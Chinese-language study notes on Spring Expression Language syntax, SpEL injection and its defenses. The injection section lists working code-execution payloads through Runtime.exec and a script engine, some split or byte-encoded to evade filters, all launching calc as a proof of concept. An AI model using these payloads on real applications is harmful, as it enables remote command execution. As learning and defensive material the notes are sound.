# SpEL参考文档
- https://cloud.tencent.com/developer/article/1676200
- https://www.cnblogs.com/xfeiyun/p/16914131.html
- https://juejin.cn/post/7117839866523549710#heading-2
# AOP讲解
- https://www.liaoxuefeng.com/wiki/1252599548343744/1266265125480448
- https://pdai.tech/md/spring/spring-x-framework-aop.html#google_vignette

# SpEl + AOP 实现日志记录
- https://blog.csdn.net/ke7025/article/details/122185525

# SpEL 注入
https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/

# SpEL表达式 #{} 和 {} 和 # 和 '' 的使用
1. #{} 表达式
   #{} 用于在 Spring 配置文件中表示需要解析的 SpEL 表达式。主要用于注解、XML 配置和属性文件中，通常在需要动态计算的场景下使用。
```java 
@Value("#{systemProperties['user.home']}")
private String userHome;
```
2. `#` 符号   
`#` 符号在 SpEL 表达式中用于引用变量或方法。通常在解析上下文中使用，以引用方法、属性或在表达式中定义的变量。
```java 
SpelExpressionParser parser = new SpelExpressionParser();
StandardEvaluationContext context = new StandardEvaluationContext();
context.setVariable("number", 42);

Integer number = parser.parseExpression("#number").getValue(context, Integer.class);
```
3. ` '' `字符串  
   用于在 SpEL 表达式中表示字符串文字。字符串文字在 SpEL 表达式中必须用单引号括起来，以区分其他类型的值（如数字、变量等）。
```java 
SpelExpressionParser parser = new SpelExpressionParser();
String result = parser.parseExpression("'Hello ' + 'World'").getValue(String.class);
```
4. `{}`   
    花括号 {} 通常用于在集合、数组或映射中表示集合字面量。以下是一些具体的用法和示例。
# Spel注入  
存在Spel注入的前提是存在SpEl相关的库，如下是相关的库
```java
org.springframework.expression.spel.standard
SpelExpressionParser
parseExpression
expression.getValue();
expression.setValue();
```
 SpEl解析SpEL提供了两套不同的接口，分别是"SimpleEvaluationContext"和"StandardEvaluationContext"。其中"SimpleEvaluationContext" 
 仅支持简单的表达式，抛弃了Java类型引用，构造函数，相较比较安全。而"StandardEvaluationContext" 支持复杂的表达式，如方法调用、属性访问等。
 如果在不指定EvaluationContext的情况下，SpEl默认使用"StandardEvaluationContext"。
 ```java
// 执行exec
T(java.lang.Runtime).getRuntime().exec("calc.exe");
#this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc.exe");

```

## 构造payload
```java
T(java.lang.Ru" + "ntime).getRuntime().exec('calc');
String spel = "T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[]))" +".invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")" +".getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass()" +".forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]{\"cmd\",\"/C\",\"calc\"})\n";
new javax.script.ScriptEngineManager().getEngineByName("javascript").eval("java.lang.Runtime.getRuntime().exec('calc')")";
T(java.lang.Runtime).getRuntime().exec("calc")
T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x63,0x61,0x6c,0x63}))
```

# Spel 防御
##  使用 SimpleEvaluationContext
```java
SpelExpressionParser parser = new SpelExpressionParser();
SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
expression.setValue(context, "payload");
```

##  白名单过滤
略
